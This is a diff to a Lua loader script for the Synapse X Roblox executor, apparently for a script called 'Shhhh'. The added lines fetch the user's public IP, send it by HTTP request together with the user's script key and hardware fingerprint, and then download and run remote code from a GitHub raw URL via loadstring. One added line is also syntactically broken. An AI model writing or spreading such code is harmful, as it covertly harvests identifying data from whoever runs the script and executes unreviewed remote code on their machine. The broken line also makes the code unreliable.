@@ -1,7 +1,7 @@
 script_key = getgenv().Shhhh.Options.Key;
 
 local http_request = syn.request;
-
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
 local decoded = game:GetService('HttpService'):JSONDecode(body)
 local hwid = decoded.headers["Syn-Fingerprint"]
@@ -13,7 +13,8 @@ local response = syn.request(
         Headers = {
             ['Content-Type'] = 'application/json'
         },
-        Body = game:GetService('HttpService'):JSONEncode({content = "Script Key: " ..script_key .. "HWID: "..hwid})
+        Body = game:GetService('HttpService'):JSONEncode({content = "Script Key: " ..script_key .. "\nHWID: "..hwid .. \n"IP: " ..ip})
     }
 );
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xfarzad/Shhhh/main/BETA", true))()
